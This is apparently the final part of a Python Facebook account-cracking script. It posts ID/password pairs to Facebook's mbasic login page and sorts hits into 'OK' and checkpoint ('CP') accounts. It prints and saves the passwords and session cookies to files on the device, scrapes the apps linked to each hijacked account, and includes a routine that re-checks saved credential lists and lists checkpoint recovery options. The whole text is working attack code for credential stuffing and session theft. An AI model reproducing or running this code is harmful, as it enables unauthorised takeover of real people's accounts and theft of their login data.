                                print(f'\r\r\n{x}[ {m}𓆩𝐒𝐃𝐌-𝐕𝐈𝐏𓆪 ¦¦ 𝗣𝗬𝗧𝗛𝗢𝗡-𝐶𝑃{x}]\n{m}ᡕᠵ᠊ᡃ່࡚ࠢ࠘ ⸝່ࠡࠣ᠊߯᠆ࠣ࠘ᡁࠣ࠘᠊᠊ࠢ࠘~~FB{x}:{m} {tahun(idf)}\n{m}UID{x}:{m} {idf}\n{m}PASS{x}:{m} {pw}\n{m}COOKIES{x}:{m} {kuki} ')
                                open('/sdcard/X - FILE/'+cpc,'a').write(idf+'∣'+pw+'\n')
                                akun.append(idf+'|'+pw)
                                cp+=1
                                break
                        elif "c_user" in ses.cookies.get_dict().keys():
                                ok+=1
                                coki=po.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                                kukis = kuki.replace(f'c_user={idf};datr','sb')
                                print(f'\r\r\n{x}[ {H}𓆩𝐒𝐃𝐌-𝐕𝐈𝐏𓆪 ¦¦ 𝗣𝗬𝗧𝗛𝗢𝗡-𝑂𝐾 {x}]\n{H}Yᡕᠵ᠊ᡃ່࡚ࠢ࠘ ⸝່ࠡࠣ᠊߯᠆ࠣ࠘ᡁࠣ࠘᠊᠊ࠢ࠘~~FB{x}:{H} {tahun(idf)}\n{H}UID{x}:{H} {idf}\n{H}PASS{x}:{H} {pw}\n{H}COOKIES{x}:{H} {kuki} ')
                                open('/sdcard/X - FILE/'+okc,'a').write(idf+'∣'+pw+'\n')
                                infoaccount(kuki)
#                               cek_apk(kuki)
                                break
                        else:
                                continue
                except requests.exceptions.ConnectionError:
                        time.sleep(3)
        loop+=1
def ceker(idf,pw):
        global cp
        ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
        head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
        ses = requests.Session()
        try:
                hi = ses.get('https://mbasic.facebook.com')
                ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
                jo = ho.find('form')
                data = {}
                lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
                for anj in jo('input'):
                        if anj.get('name') in lion:
                                data.update({anj.get('name'):anj.get('value')})
                kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
                print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                cp+=1
                opsi = kent.find_all('option')
                if len(opsi)==0:
                        print('\r%s---> Tap Yes / A2F (Check  Login Id Lite/Mbasic%s)'%(hh,x))
                else:
                        for opsii in opsi:
                                print('\r%s---> %s%s'%(kk,opsii.text,x))
        except Exception as c:
                print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
                print('\r%s---> Cannot Check Options (Check Login In Lite/Basic)%s'%(u,x))
                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                cp+=1

def cek_opsi():
        c = len(akun)
        hu = '#'%(c)
        cetak(nel(hu, title='CEK OPSI'))
        input(u+'['+h+'•'+u+'] INPUT')
        cek = '# PROSESES CO'
        sol().print(mark(cek, style='pink'))
        love = 0
        for kes in akun:
                try:
                        try:
                                id,pw = kes.split('|')[0],kes.split('|')[1]
                        except IndexError:
                                time.sleep(2)
                                print('\r%s++++ %s ERROR=-     %s'%(b,kes,x))
                                print('\r%s---> Separator Not Supported For This Program%s'%(u,x))
                                continue
                        bi = random.choice([u,k,kk,b,h,hh])
                        print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
                        ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
                        ses = requests.Session()
                        header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
                        hi = ses.get('https://mbasic.facebook.com')
                        ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
                        if "checkpoint" in ses.cookies.get_dict().keys():
                                try:
                                        jo = ho.find('form')
                                        data = {}
                                        lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
                                        for anj in jo('input'):
                                                if anj.get('name') in lion:
                                                        data.update({anj.get('name'):anj.get('value')})
                                        kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
                                        print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
                                        opsi = kent.find_all('option')
                                        if len(opsi)==0:
                                                print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
                                        else:
                                                for opsii in opsi:
                                                        print('\r%s---> %s%s'%(kk,opsii.text,x))
                                except:
                                        print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
                                        print('\r%s---> Cannot Check Options%s'%(u,x))
                        elif "c_user" in ses.cookies.get_dict().keys():
                                print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
                        else:
                                print('\r%s++++ %s|%s ----> ERROR       %s'%(x,id,pw,x))
                        love+=1
                except requests.exceptions.ConnectionError:
                        print('')
                        li = '#INTERNET NO CONNECTED'
                        sol().print(mark(li, style='red'))
                        exit()
        dah = '# DONE'
        sol().print(mark(dah, style='pink'))
        exit()

def chek():
    os.system('clear')
    banner()
    menu()


def infoaccount(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➥ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➥ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))
if __name__=='__main__':
        try:os.system('git pull')
        except:pass
        try:os.mkdir('OK')
        except:pass
        try:os.mkdir('CP')
        except:pass
        try:os.mkdir('/sdcard/X - FILE')
        except:pass
        try:os.system('touch .prox.txt')
        except:pass
        chek()
ALSOLTAN()

